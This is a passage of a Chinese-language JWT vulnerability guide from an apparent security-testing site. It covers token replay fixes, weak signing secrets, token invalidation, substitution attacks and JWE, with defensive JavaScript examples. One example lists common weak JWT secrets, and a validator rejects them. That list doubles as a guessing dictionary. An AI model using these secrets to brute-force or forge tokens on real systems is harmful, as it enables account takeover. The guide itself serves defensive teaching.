                        <li><strong>网络拦截</strong>: 攻击者从网络流量中捕获令牌</li>
                        <li><strong>XSS攻击</strong>: 恶意脚本从客户端存储中窃取令牌</li>
                        <li><strong>日志文件暴露</strong>: 令牌在服务器日志或错误消息中暴露</li>
                        <li><strong>共享计算机</strong>: 令牌留在共享设备上的浏览器存储中</li>
                    </ol>
                    
                    <h3>如何修复</h3>
                    
                    <h4>1. 短令牌过期时间</h4>
                    <ul>
                        <li>使用短寿命访问令牌（15-30分钟）</li>
                        <li>实施刷新令牌轮换</li>
                        <li>对敏感操作强制重新身份验证</li>
                    </ul>
                    
                    <h4>2. 令牌黑名单</h4>
                    <ul>
                        <li>维护已撤销令牌的黑名单</li>
                        <li>每次请求检查黑名单</li>
                        <li>注销时将令牌添加到黑名单</li>
                    </ul>
                    
                    <h4>3. Jti（JWT ID）跟踪</h4>
                    <ul>
                        <li>在每个令牌中包含唯一的"jti"声明</li>
                        <li>跟踪已使用的令牌以防止重放</li>
                        <li>通过jti实施令牌撤销</li>
                    </ul>
                    
                    <h4>4. 额外安全措施</h4>
                    <ul>
                        <li>对所有令牌传输使用HTTPS</li>
                        <li>实施适当的CORS策略</li>
                        <li>尽可能使用HttpOnly cookie</li>
                        <li>实施会话绑定</li>
                    </ul>
                    
                    <pre><code class="language-javascript">// 令牌黑名单实现
const blacklistedTokens = new Set();

function blacklistToken(jti) {
    blacklistedTokens.add(jti);
    // 同样存储在数据库中以保持持久性
}

function isTokenBlacklisted(jti) {
    return blacklistedTokens.has(jti);
}

// 中间件检查黑名单
function validateToken(req, res, next) {
    try {
        const token = req.headers.authorization?.split(' ')[1];
        const decoded = jwt.verify(token, secretKey);
        
        if (isTokenBlacklisted(decoded.jti)) {
            return res.status(401).json({ error: '令牌已被撤销' });
        }
        
        req.user = decoded;
        next();
    } catch (err) {
        res.status(401).json({ error: '无效令牌' });
    }
}

// 注销端点
app.post('/logout', validateToken, (req, res) => {
    blacklistToken(req.user.jti);
    res.json({ message: '成功注销' });
});</code></pre>
                </div>

                <div id="weak-secrets" class="docs-section">
                    <h2>弱密钥</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        许多JWT实现使用弱或可预测的密钥进行HMAC签名。这使得它们容易受到暴力破解攻击和字典攻击。
                    </p>
                    
                    <h3>常见的弱密钥</h3>
                    <ul>
                        <li>来自文档的默认或示例密钥</li>
                        <li>简单密码或短语</li>
                        <li>公司名称或产品名称</li>
                        <li>连续或有模式的字符串</li>
                        <li>低熵的短密钥</li>
                    </ul>
                    
                    <h3>弱密钥示例</h3>
                    <pre><code class="language-javascript">// 非常不好：常见的弱密钥
const secrets = [
    "secret",
    "password",
    "123456",
    "your-256-bit-secret",
    "mycompany",
    "jwt-secret",
    "supersecret",
    "admin",
    "key",
    "token"
];</code></pre>
                    
                    <h3>如何修复</h3>
                    
                    <h4>1. 生成强密钥</h4>
                    <ul>
                        <li>使用密码学安全的随机数生成器</li>
                        <li>HS256至少需要256位（32字节）</li>
                        <li>更高的熵以获得更好的安全性</li>
                    </ul>
                    
                    <pre><code class="language-javascript">// 生成强密钥
const crypto = require('crypto');

// 生成256位密钥
const secret256 = crypto.randomBytes(32).toString('hex');

// 生成512位密钥
const secret512 = crypto.randomBytes(64).toString('hex');

// 使用base64编码
const secretBase64 = crypto.randomBytes(32).toString('base64');</code></pre>
                    
                    <h4>2. 使用非对称算法</h4>
                    <ul>
                        <li>考虑使用RS256或ES256而不是HS256</li>
                        <li>私钥用于签名，公钥用于验证</li>
                        <li>消除对共享密钥的需求</li>
                    </ul>
                    
                    <h4>3. 密钥管理</h4>
                    <ul>
                        <li>将密钥存储在环境变量中</li>
                        <li>使用密钥管理服务（AWS KMS、Azure Key Vault）</li>
                        <li>实施密钥轮换</li>
                        <li>永远不要在源代码中硬编码密钥</li>
                    </ul>
                    
                    <pre><code class="language-javascript">// 安全密钥管理
const secret = process.env.JWT_SECRET;

if (!secret) {
    throw new Error('需要JWT_SECRET环境变量');
}

if (secret.length < 32) {
    throw new Error('JWT密钥长度必须至少为32个字符');
}

// 检查常见弱密钥
const weakSecrets = ['secret', 'password', '123456', 'your-256-bit-secret'];
if (weakSecrets.includes(secret.toLowerCase())) {
    throw new Error('检测到弱JWT密钥');
}</code></pre>
                </div>

                <div id="token-invalidation" class="docs-section">
                    <h2>令牌失效问题</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        与基于会话的身份验证不同，JWT在设计上是无状态的。这使得在过期时间之前使令牌失效变得困难，导致用户注销、更改密码或权限被撤销时出现安全问题。
                    </p>
                    
                    <h3>为什么危险？</h3>
                    <ul>
                        <li>令牌在用户注销后仍然有效</li>
                        <li>受损的令牌无法立即撤销</li>
                        <li>权限更改在令牌过期前不会生效</li>
                        <li>被终止的员工可能保留访问权限</li>
                    </ul>
                    
                    <h3>解决方案</h3>
                    
                    <h4>1. 令牌黑名单</h4>
                    <p>维护已撤销令牌的黑名单并在每个请求上检查它。</p>
                    
                    <pre><code class="language-javascript">// 基于Redis的令牌黑名单
const redis = require('redis');
const client = redis.createClient();

async function blacklistToken(jti, exp) {
    const ttl = exp - Math.floor(Date.now() / 1000);
    await client.setex(`blacklist:${jti}`, ttl, 'revoked');
}

async function isTokenBlacklisted(jti) {
    const result = await client.get(`blacklist:${jti}`);
    return result === 'revoked';
}

// 中间件
async function validateToken(req, res, next) {
    try {
        const token = req.headers.authorization?.split(' ')[1];
        const decoded = jwt.verify(token, secretKey);
        
        if (await isTokenBlacklisted(decoded.jti)) {
            return res.status(401).json({ error: '令牌已撤销' });
        }
        
        req.user = decoded;
        next();
    } catch (err) {
        res.status(401).json({ error: '无效令牌' });
    }
}</code></pre>
                    
                    <h4>2. 使用刷新令牌的短寿命令牌</h4>
                    <p>使用短寿命访问令牌（15-30分钟）和刷新令牌。</p>
                    
                    <pre><code class="language-javascript">// 刷新令牌实现
const refreshTokens = new Map(); // 生产环境中使用数据库

function generateTokens(user) {
    const accessToken = jwt.sign(
        { sub: user.id, role: user.role },
        secretKey,
        { expiresIn: '15m' }
    );
    
    const refreshToken = crypto.randomBytes(32).toString('hex');
    refreshTokens.set(refreshToken, user.id);
    
    return { accessToken, refreshToken };
}

app.post('/refresh', async (req, res) => {
    const { refreshToken } = req.body;
    
    if (!refreshTokens.has(refreshToken)) {
        return res.status(401).json({ error: '无效的刷新令牌' });
    }
    
    const userId = refreshTokens.get(refreshToken);
    const user = await getUserById(userId);
    
    // 生成新令牌
    const tokens = generateTokens(user);
    
    // 撤销旧的刷新令牌
    refreshTokens.delete(refreshToken);
    
    res.json(tokens);
});</code></pre>
                    
                    <h4>3. 基于版本的失效</h4>
                    <p>在令牌中包含版本号，并在需要失效时增加它。</p>
                    
                    <pre><code class="language-javascript">// 基于版本的失效
const userTokenVersions = new Map();

function generateToken(user) {
    const version = userTokenVersions.get(user.id) || 0;
    
    return jwt.sign(
        { 
            sub: user.id, 
            role: user.role,
            version: version
        },
        secretKey,
        { expiresIn: '1h' }
    );
}

function invalidateUserTokens(userId) {
    const currentVersion = userTokenVersions.get(userId) || 0;
    userTokenVersions.set(userId, currentVersion + 1);
}

// 中间件
function validateToken(req, res, next) {
    try {
        const token = req.headers.authorization?.split(' ')[1];
        const decoded = jwt.verify(token, secretKey);
        
        const currentVersion = userTokenVersions.get(decoded.sub) || 0;
        if (decoded.version < currentVersion) {
            return res.status(401).json({ error: '令牌版本不匹配' });
        }
        
        req.user = decoded;
        next();
    } catch (err) {
        res.status(401).json({ error: '无效令牌' });
    }
}</code></pre>
                </div>

                <div id="token-substitution" class="docs-section">
                    <h2>令牌替换攻击</h2>
                    
                    <h3>什么是这个问题？</h3>
                    <p>
                        当攻击者在一个不同的上下文中使用为一个上下文设计的令牌时，会发生令牌替换攻击。当令牌缺少适当的受众验证或在多个服务中使用相同令牌时，可能会发生这种情况。
                    </p>
                    
                    <h3>替换攻击类型</h3>
                    
                    <h4>1. 跨服务令牌复用</h4>
                    <p>使用为服务A颁发的令牌访问服务B</p>
                    
                    <h4>2. 权限提升</h4>
                    <p>在需要更高权限的上下文中使用作用域有限的令牌</p>
                    
                    <h4>3. 跨域攻击</h4>
                    <p>在不同域或应用程序之间使用令牌</p>
                    
                    <h3>如何修复</h3>
                    
                    <h4>1. 受众验证</h4>
                    <p>始终包含并验证受众（aud）声明</p>
                    
                    <pre><code class="language-javascript">// 特定服务的令牌验证
function validateToken(token, expectedAudience) {
    try {
        const decoded = jwt.verify(token, secretKey, {
            audience: expectedAudience,
            issuer: 'trusted-auth-server'
        });
        return decoded;
    } catch (err) {
        throw new Error('令牌验证失败');
    }
}

// 在不同服务中的用法
// 服务A
const userServiceToken = validateToken(token, 'user-service');

// 服务B  
const paymentServiceToken = validateToken(token, 'payment-service');</code></pre>
                    
                    <h4>2. 基于作用域的授权</h4>
                    <p>在令牌中包含特定作用域并验证它们</p>
                    
                    <pre><code class="language-javascript">// 基于作用域的令牌
const token = jwt.sign({
    sub: user.id,
    aud: 'payment-service',
    scope: ['read:payments', 'write:payments'],
    exp: Math.floor(Date.now() / 1000) + 3600
}, secretKey);

// 作用域验证中间件
function requireScope(requiredScope) {
    return (req, res, next) => {
        const token = req.headers.authorization?.split(' ')[1];
        
        try {
            const decoded = jwt.verify(token, secretKey);
            
            if (!decoded.scope || !decoded.scope.includes(requiredScope)) {
                return res.status(403).json({ error: '作用域不足' });
            }
            
            req.user = decoded;
            next();
        } catch (err) {
            res.status(401).json({ error: '无效令牌' });
        }
    };
}

// 用法
app.get('/payments', requireScope('read:payments'), (req, res) => {
    // 处理支付读取
});

app.post('/payments', requireScope('write:payments'), (req, res) => {
    // 处理支付创建
});</code></pre>
                    
                    <h4>3. 特定上下文的令牌</h4>
                    <p>为不同上下文生成不同的令牌</p>
                    
                    <pre><code class="language-javascript">// 特定上下文的令牌生成
function generateContextToken(user, context) {
    const basePayload = {
        sub: user.id,
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 3600
    };
    
    switch (context) {
        case 'admin':
            return jwt.sign({
                ...basePayload,
                aud: 'admin-panel',
                role: 'admin',
                scope: ['admin:read', 'admin:write']
            }, secretKey);
            
        case 'api':
            return jwt.sign({
                ...basePayload,
                aud: 'api-service',
                role: user.role,
                scope: getUserScopes(user)
            }, secretKey);
            
        case 'mobile':
            return jwt.sign({
                ...basePayload,
                aud: 'mobile-app',
                role: user.role,
                device: 'mobile'
            }, secretKey);
            
        default:
            throw new Error('无效上下文');
    }
}</code></pre>
                </div>

                <div class="docs-section">
                    <h2>JSON Web加密（JWE）</h2>
                    
                    <h3>什么是JWE？</h3>
                    <p>
                        JSON Web加密（JWE）是一种用于加密JWT有效载荷以确保机密性的标准。与仅提供完整性和真实性的JWS（JSON Web签名）不同，JWE加密有效载荷，以便只有授权方可以阅读它。
                    </p>
                    
                    <h3>何时使用JWE</h3>
                    <ul>
                        <li>当JWT有效载荷包含敏感信息时</li>
                        <li>合规要求（GDPR、HIPAA等）</li>
                        <li>关键应用程序的额外安全层</li>
                        <li>当令牌通过不可信通道传输时</li>
                    </ul>
                    
                    <h3>JWE结构</h3>
                    <p>JWE由五个部分组成，以点分隔：</p>
                    <pre><code class="language-text">BASE64URL(UTF8(JWE受保护头部)) + '.' +
BASE64URL(JWE加密密钥) + '.' +
BASE64URL(JWE初始化向量) + '.' +
BASE64URL(JWE密文) + '.' +
BASE64URL(JWE认证标签)</code></pre>
                    
                    <h3>JWE实现示例</h3>
                    <pre><code class="language-javascript">// 使用jose库的Node.js JWE实现
const { EncryptJWT, jwtDecrypt } = require('jose');
const crypto = require('crypto');

// 生成对称密钥
const secret = crypto.randomBytes(32);

// 创建加密JWT
async function createJWE(payload) {
    const jwt = await new EncryptJWT(payload)
        .setProtectedHeader({ alg: 'A256KW', enc: 'A256GCM' })
        .setIssuedAt()
        .setExpirationTime('2h')
        .encrypt(secret);
    
    return jwt;
}

// 解密并验证JWE
async function verifyJWE(jwe) {
    const { payload, protectedHeader } = await jwtDecrypt(jwe, secret);
    return payload;
}

// 用法
async function example() {
    const sensitivePayload = {
        sub: 'user123',
        ssn: '123-45-6789',
        salary: 75000,
        role: 'admin'
    };
    
    // 创建加密JWT
    const jwe = await createJWE(sensitivePayload);
    console.log('加密JWT:', jwe);
    
    // 解密并验证
    const decrypted = await verifyJWE(jwe);
    console.log('解密有效载荷:', decrypted);
}</code></pre>
                    
                    <h3>JWE与JWS比较</h3>
                    <div class="table-responsive">
                        <table>
                            <thead>
                                <tr>
                                    <th>特性</th>
                                    <th>JWS（JSON Web签名）</th>
                                    <th>JWE（JSON Web加密）</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>目的</td>
                                    <td>完整性和真实性</td>
                                    <td>机密性</td>
                                </tr>
                                <tr>
                                    <td>有效载荷可见性</td>
                                    <td>可见（Base64编码）</td>
                                    <td>加密（不可见）</td>
                                </tr>
                                <tr>
                                    <td>性能</td>
                                    <td>更快</td>
                                    <td>更慢（加密开销）</td>
                                </tr>
                                <tr>
                                    <td>大小</td>
                                    <td>更小</td>
                                    <td>更大（加密元数据）</td>
                                </tr>
                                <tr>
                                    <td>用例</td>
                                    <td>标准身份验证</td>
                                    <td>敏感数据传输</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>

                <div class="docs-section">
                    <h2>附加资源</h2>
                    
                    <ul class="resource-list">
                        <li>
                            <a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" target="_blank" class="resource-link">
                                <i class="fas fa-file-alt"></i>
                                <div>
                                    <h4>JSON Web Token库中的关键漏洞</h4>
                                    <p>Auth0对关键JWT漏洞的研究</p>
                                </div>
                            </a>
                        </li>
                        <li>
                            <a href="https://github.com/ticarpi/jwt_tool/wiki" target="_blank" class="resource-link">
                                <i class="fas fa-tools"></i>
                                <div>
                                    <h4>JWT攻击手册</h4>
                                    <p>JWT攻击和技术综合指南</p>
                                </div>
                            </a>
                        </li>
                        <li>
                            <a href="https://portswigger.net/web-security/jwt" target="_blank" class="resource-link">
                                <i class="fas fa-graduation-cap"></i>
                                <div>
                                    <h4>PortSwigger网络安全学院：JWT攻击</h4>
                                    <p>JWT漏洞的交互式实验室和教程</p>
                                </div>
                            </a>
                        </li>
                    </ul>
                    
                    <div class="next-steps">
                        <h3>下一步</h3>
                        <div class="next-links">
                            <a href="secure-jwt-implementation.html" class="next-link">
                                <i class="fas fa-lock"></i>
                                <span>学习安全实现</span>
                            </a>
                            <a href="tool-guides/decoder-analyzer.html" class="next-link">
                                <i class="fas fa-search"></i>
                                <span>尝试JWT分析工具</span>
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer-container">
            <div class="footer-section">
                <h3>JWTAuditor</h3>
                <p>专业的JWT安全测试平台，面向渗透测试人员和网络安全专业人员。使用完整的客户端隐私解码、分析漏洞和审计JSON Web Token实现。</p>
            </div>
            <div class="footer-section">
                <h3>文档</h3>
                <ul class="footer-links">
                    <li><a href="jwt-fundamentals.html">JWT基础</a></li>
                    <li><a href="jwt-vulnerabilities-guide.html">漏洞指南</a></li>
                    <li><a href="secure-jwt-implementation.html">安全实现</a></li>
                </ul>
            </div>
            <div class="footer-section">
                <h3>资源</h3>
                <ul class="footer-links">
                    <li><a href="../about.html">关于我们</a></li>
                    <li><a href="https://jwt.io/" target="_blank">JWT.io</a></li>
                    <li><a href="https://portswigger.net/web-security/jwt" target="_blank">PortSwigger JWT攻击</a></li>
                </ul>
            </div>
        </div>
        <div class="footer-bottom">
<p>&copy; 2025 由
  <a href="https://github.com/dr34mhacks" style="color: var(--primary-color);">Sid</a> & 
  <a href="https://github.com/thecybersandeep" style="color: var(--primary-color);">Sandeep</a> 开发的项目 • 
  
</p>            <div class="social-links">
                <a href="https://x.com/infosecmania" target="_blank"><i class="fab fa-twitter"></i></a>
                <a href="https://www.linkedin.com/company/infosecmania" target="_blank"><i class="fab fa-linkedin"></i></a>
                <a href="https://github.com/dr34mhacks/jwtauditor" target="_blank"><i class="fab fa-github"></i></a>
            </div>
        </div>
    </footer>

    <button class="sidebar-toggle" aria-label="Toggle sidebar">
        <i class="fas fa-bars"></i>
    </button>

    <button class="scroll-to-top" aria-label="Scroll to top">
        <i class="fas fa-arrow-up"></i>
    </button>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
    <script src="js/docs.js"></script>
    <script>
        // Scroll to top functionality
        const scrollToTopBtn = document.querySelector('.scroll-to-top');
        
        window.addEventListener('scroll', () => {
            if (window.pageYOffset > 300) {
                scrollToTopBtn.classList.add('visible');
            } else {
                scrollToTopBtn.classList.remove('visible');
            }
        });
        
        scrollToTopBtn.addEventListener('click', () => {
            window.scrollTo({
                top: 0,
                behavior: 'smooth'
            });
        });
    </script>
</body>
</html>